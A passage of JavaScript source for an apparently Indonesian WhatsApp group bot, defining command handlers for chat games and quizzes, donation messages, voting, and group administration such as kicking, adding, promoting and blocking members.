            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'You are still in the game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            reply('Partner found!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Waiting @${room.game.currentTurn.split('@')[0]}

Type *give up* to surrender and admit defeat`
            if (room.x !== room.o) await Pajrin.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await Pajrin.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            reply('Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case '12345delttc': case '12345delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            Pajrin.sendText(m.chat, `Successfully delete the TicTacToe session`, m)
            } else if (!this.game) {
            reply(`TicTacToe Session🎮 there is not any`)
            } else throw '?'
            } catch (e) {
            reply('error')
            }
            }
            break
            case '12345suitpvp': case '12345suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Complete your previous suit`)
	    if (m.mentionedJid[0] === m.sender) return reply(`Can't play with myself !`)
            if (!m.mentionedJid[0]) return reply(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `The person you are challenging is playing suit with someone else :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} challenging @${m.mentionedJid[0].split`@`[0]} to play suit

Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
            this.suit[id] = {
            chat: await Pajrin.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) Pajrin.sendText(m.chat, `_Suit time out_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
	    
case '12345donasi': case '12345donate': {
	don = fs.readFileSync('./BotMedia/donasi.jpg')
let buttons = [
                    {buttonId: `${prefix}owner`, buttonText: {displayText: '👤OWNER BOT👤'}, type: 1}
                ]
                let buttonMessage = {
                    image: don,
                    caption: global.donasi,
                    footer:  `© ${global.botnma} by ${global.ownernma}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
       }
          break
case '12345sewa': case '12345sewabot': case '12345botsewa': {
	don = fs.readFileSync('./BotMedia/sewa.jpg')
let buttons = [
                    {buttonId: `${prefix}owner`, buttonText: {displayText: '👤OWNER BOT👤'}, type: 1}
                ]
                let buttonMessage = {
                    image: don,
                    caption: global.sewabot,
                    footer:  `© ${global.botnma} by ${global.ownernma}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
       }
          break
case '12345sc': case '12345script': case '12345scbot': case '12345scriptbot': 
reply(global.script)
          break
            
            
case '12345chat404': case '12345cet404': {
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Pilih chat setting`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_${global.botnma}_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "Set Chat Options",
								"rows": [
									{
										"title": "Read Chat",
										"description": `Tandai telah di baca, room chat`,
										"rowId": `${prefix}setchat read`
									},
									{
										"title": "Unread Chat",
										"description": `Tandai belum di baca, room chat`,
										"rowId": `${prefix}setchat unread`
									},
									{
										"title": "Archive Chat",
										"description": `Memindahkan room chat ke archive`,
										"rowId": `${prefix}setchat archive`
									},
									{
										"title": "Unarchive Chat",
										"description": `Memindahkan room chat dari archive ke layar utama`,
										"rowId": `${prefix}setchat unarchive`
									},
										{
											"title": "Delete",
										"description": `Menghapus obrolan chat`,
										"rowId": `${prefix}setchat delete`
										},
										{
											"title": "Mute",
										"description": `Bot tidak akan merespon di room chat ini`,
										"rowId": `${prefix}setchat mute`
										},
										{
											"title": "Unmute",
										"description": `Bot akan kembali merespon di room chat ini`,
										"rowId": `${prefix}setchat unmute`
										}
								]
							}
						],
          listType: 1
                }
            }), {})
            Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
            case '12345404setchat': {
               // if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    Pajrin.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    Pajrin.chatModify({ mute: null }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    Pajrin.chatModify({  archive: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    Pajrin.chatModify({ archive: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    Pajrin.chatModify({ markRead: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    Pajrin.chatModify({ markRead: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    Pajrin.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                }
            }
            break
	    case '12345family100hdiejebdjdijdjdjdj': { //this is in indonesian so if u want to activate u can but will be in indonesian
                if ('family100'+m.chat in _family100) {
                    reply('There are still unfinished sessions!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Answer the following questions :*\n${random.soal}\n\nThere is *${random.jawaban.length}* Answer ${random.jawaban.find(v => v.includes(' ')) ? `(some answers have spaces)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await Pajrin.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case '12345halah': case '12345hilih': case '12345heleh': case '12345huluh': case '12345holoh': //this is in indonesian so if u want to activate u can but will be in indonesian (thanks to respected creator of this case)
            if (!m.quoted && !text) throw `Send/reply text with caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
case '12345todi': case '12345hilihdkksls': case '12345huluhkdksls': case '12345helehkdkdkd': case '12345holohkdkskks': //this is in indonesian so if u want to activate u can but will be in indonesian (thanks to respected creator of this case)
            if (!m.quoted && !text) throw `Send/reply text with caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
     users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
     //tod = users.replace(/[@s.whatsapp.net]/)
  teksnya = `catatan:
${tex}

@${users.split("@")[0]} 
`
Pajrin.sendMessage(m.chat, { text: teksnya, contextInfo: { mentionedJid: [users] }}, { quoted: m})

            break
            case '12345tebak': { //this is in indonesian so if u want to activate u can but will be in indonesian (thanks to respected creator of this case)
                if (!text) {
                	let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Pilih game tebak-tebakan`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_${global.botnma}_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "Pilih game tebak tebakan",
								"rows": [
									{
										"title": "Tebak Lagu",
										"description": `Game tebak lagu`,
										"rowId": `${prefix}Tebak lagu`
									},
									{
										"title": "Tebak Gambar",
										"description": `Game tebak gambar`,
										"rowId": `${prefix}Tebak gambar`
									},
									{
										"title": "Tebak Kata",
										"description": `Game tebak kata`,
										"rowId": `${prefix}tebak kata`
									},
									{
										"title": "Tebak Kalimat",
										"description": `Game tebak kalimat`,
										"rowId": `${prefix}tebak kalimat`
									},
										{
											"title": "Tebak Lirik",
										"description": `Game tebak lirik`,
										"rowId": `${prefix}tebak lirik`
										},
										{
											"title": "Tebak Lontong",
										"description": `Game tebak lontong`,
										"rowId": `${prefix}tebak lontong`
										}
								]
							}
						],
          listType: 1
                }
            }), {})
            Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
               } else if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await Pajrin.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    Pajrin.sendText(m.chat, `The song is a song from?\n\nArtist : ${result.artist}\nTime : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Pajrin.sendButtonText(m.chat, [{ buttonId: '#tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Time Out\nAnswer:  ${tebaklagu[m.sender.split('@')[0]]}\n\nWant to play? press the button below`,  `${global.fake}`, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Pajrin.sendImage(m.chat, result.img, `Please answer the questions above\n\nDescription : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Pajrin.sendButtonText(m.chat, [{ buttonId: '#tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Time has run out\Answer:  ${tebakgambar[m.sender.split('@')[0]]}\n\nWant to play? press the button below`,  `${global.fake}`, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Pajrin.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nTime : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Pajrin.sendButtonText(m.chat, [{ buttonId: '#tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Time has run out\nAnswer:  ${tebakkata[m.sender.split('@')[0]]}\n\nWant to play? press the button below`,  `${global.fake}`, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Pajrin.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nTime : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Pajrin.sendButtonText(m.chat, [{ buttonId: '#tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`,  `${global.fake}`, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Pajrin.sendText(m.chat, `These are the lyrics of the song? : *${result.soal}*?\nTime : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Pajrin.sendButtonText(m.chat, [{ buttonId: '#tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`,  `${global.fake}`, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Pajrin.sendText(m.chat, `*Answer the following questions :*\n${result.soal}*\nTime : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Pajrin.sendButtonText(m.chat, [{ buttonId: '#tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`,  `${global.fake}`, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
		
                    }
                }
            }
            break
            case '12345mathquiz': case '12345math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                let { genMath, modes } = require('./src/math')
                if (!text) {
                let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hai ${pushname}`,
                    description: `Pilih game mode math`,
                    buttonText: "𝗖𝗟𝗜𝗖𝗞 𝗠𝗘",
                    footerText: `_${global.botnma}_`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "Pilih mode game math",
								"rows": [
									{
										"title": "Mode Noob",
										"description": `Untuk anak TK\n${prefix}math noob`,
										"rowId": `${prefix}math noob`
									},
									{
										"title": "Mode Easy",
										"description": `Untuk anak SD\n${prefix}math easy`,
										"rowId": `${prefix}math easy`
									},
									{
										"title": "Mode Medium",
										"description": `Untuk anak SMP\n${prefix}math medium`,
										"rowId": `${prefix}math medium`
									},
									{
										"title": "Mode Hard",
										"description": `Untuk anak SMA\n${prefix}math hard`,
										"rowId": `${prefix}math hard`
									},
										{
											"title": "Mode Extreme",
										"description": `Untuk anak Mahasiswa\n${prefix}math extreme`,
										"rowId": `${prefix}math extreme`
										},
										{
											"title": "Mode Impossible",
										"description": `Untuk anak Sarjana\n${prefix}math impossible`,
										"rowId": `${prefix}math impossible`
										},
										{
										"title": "Mode Impossible2",
										"description": `Untuk Professor\n${prefix}math impossible2`,
										"rowId": `${prefix}math impossible2`
										}
								]
							}
						],
          listType: 1
                }
            }), {})
            Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
               } else { let result = await genMath(text.toLowerCase())
                Pajrin.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} seconds`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    reply("Time Out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
                }
            }
            break
            case '12345mysoulmate': case '12345pasanganku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Your match is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: '❤️', buttonText: { displayText: '❤️' }, type: 1 }
                    ]
                    await Pajrin.sendButtonText(m.chat, buttons, jawab,  `${global.fake}`, m, {mentions: ments})
            }
            break
            case '12345couple': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Ciee Whats Going On💖👀`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: '❤️', buttonText: { displayText: '❤️' }, type: 1 }
                    ]
                    await Pajrin.sendButtonText(m.chat, buttons, jawab,  `${global.fake}`, m, {mentions: menst})
            }
            break
            case '12345join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Enter the group link!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                replay(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await Pajrin.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
            }
            break
            case '12345leave': case '12345out': {
                if (!isCreator) throw mess.owner
                await Pajrin.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
            }
            break
	case '12345kick': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Pajrin.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
	case '12345add': {
		if (!text && !m.quoted) throw `*Mana nomor nya?*\n_Contoh:_ ${prefix + command} ${global.pemilik}`
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
           //     if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Pajrin.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
case '12345adduser': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
              //  if (!isAdmins) throw mess.admin
		let users = `${text}`
		await Pajrin.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
	case '12345promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Pajrin.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
	case '12345demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Pajrin.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
        case '12345block': {
		if (!isCreator) throw mess.owner
		if (!text && !m.quoted) throw `*Mana nomor yang mau di blockir?*\n_Contoh:_ ${prefix + command} ${global.pemilik}`
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		reply(mess.success)
await Pajrin.updateBlockStatus(users, 'block') //.then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	
}
	break
        case '12345unblock': {
		if (!isCreator) throw mess.owner
		if (!text && !m.quoted) throw `*Mana nomor yang mau di Unblockir?*\n_Contoh:_ ${prefix + command} ${global.pemilik}`
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
reply(mess.success)
		await Pajrin.updateBlockStatus(users, 'unblock') // .then((res) => reply(mess.done)).catch((err) => reply(mess.done))
	
}
case '12345unblockuser': {
		if (!isCreator) throw mess.owner
		//if (!text && !m.quoted) throw `*Mana nomor yang mau di Unblockir?*\n_Contoh:_ ${prefix + command} ${global.pemilik}`
//let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
reply(mess.success)
		await Pajrin.updateBlockStatus(`${text}`, 'unblock') // .then((res) => reply(mess.done)).catch((err) => reply(mess.done))
	Pajrin.sendMessage(`${text}`, { text: `Owner telah membuka blokir Anda dari BOT,gunakan bot dengan wajar dan jangan melakukan pelanggan terhadap peraturan pengguna`}, { quoted: m})
}
	break
	    case '12345setname': case '12345setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw '*Mana teksnya untuk judul group?*'
                await Pajrin.groupUpdateSubject(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
            }
            break
          case '12345setdesc': case '12345setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw `*Mana teksnya untuk deskripsi group?*`
                await Pajrin.groupUpdateDescription(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
            }
            break
          case '12345setppbot': case '12345setbotpp': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `Send/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Send/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Send/Reply Image Dengan Caption ${prefix + command}`
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
                await Pajrin.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                reply(mess.success)
                }
                break
           case '12345setppgroup': case '12345setgrouppp': case '12345setgcpp': case '12345setppgrup': case '12345setppgc': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Send/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
                let media = await Pajrin.downloadAndSaveMediaMessage(quoted)
                await Pajrin.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                reply(mess.success)
                }
                break
case '12345grupinfo': case '12345groupinfo':
try{
 var pic = await Pajrin.getProfilePicture(m.chat)
  } catch {
 var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
  }
let ingfo = `*G R O U P  I N F O*\n\n*Name :* ${groupName}\n*ID Group :* ${m.chat}\n*Made :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Group Owner:* @${groupMetadata.owner.split('@')[0]}\n*Number Of Admins :* ${groupAdmins.length}\n*Number Of Participants :* ${participants.length}\n*Desc :* \n${groupMetadata.desc}`
ds = await getBuffer(pic)
Pajrin.sendMessage(m.chat, { image: ds,caption: ingfo, mentions: [groupMetadata.owner] }, { quoted: m})
break
            case '12345tagall': case '12345tag': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                teks += `⭔ @${mem.id.split('@')[0]}\n`
                }
                Pajrin.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case '12345hidetag': {
            if (!m.isGroup) throw mess.group
            
            Pajrin.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)})
            }
            break

	    case '12345style': case '12345styletext': {
	      //  if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // response when limit runs out
		//db.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw `*Masukan teks !*\n_Contoh:_ ${prefix + command} it's me ${global.pengguna}`
                let anu = await styletext(text)
                let teks = `Entered Text:  ${text}\n\n`
                for (let i of anu) {
                    teks += `⭔ *${i.name}* : ${i.result}\n\n`
                }
                reply(teks)
	    }
	    break
               case '12345voting': case '12345vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Vote masih berlangsung di group ini !_\n\n*${prefix}deletevote* - untuk menghapus vote`
            if (!text) throw `*Apa yang mau di vote?*\n_Contoh:_ ${prefix + command} ${global.pengguna} maju jadi presiden Indonesia`
            reply(`Voting starts!\n\n*${prefix}upvote* - untuk setuju\n*${prefix}devote* - untuk tidak setuju\n*${prefix}cekvote* - untuk cek hasil vote\n*${prefix}deletevote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${vote[m.chat][1].length}

 
└────

┌〔 DEVOTE 〕
 
├ Total: ${vote[m.chat][2].length}

 
└────

*${prefix}hapusvote* - untuk menghapus votes`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '👍🏻Up-Vote👍🏻'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '👎🏻De-Vote👎🏻'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer:  `${global.fake}`,
                buttons: buttonsVote,
                headerType: 1
            }
            Pajrin.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case '12345upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*Type ${prefix}vote* - untuk memulai voting`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'You have Voted'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

┌〔 DEVOTE 〕
 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

*${prefix}hapusvote* - untuk menghapus votes`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '👍🏻Up-Vote👍🏻'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '👎🏻De-Vote👎🏻'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer:  `${global.fake}`,
                buttons: buttonsUpvote,
                headerType: 1,
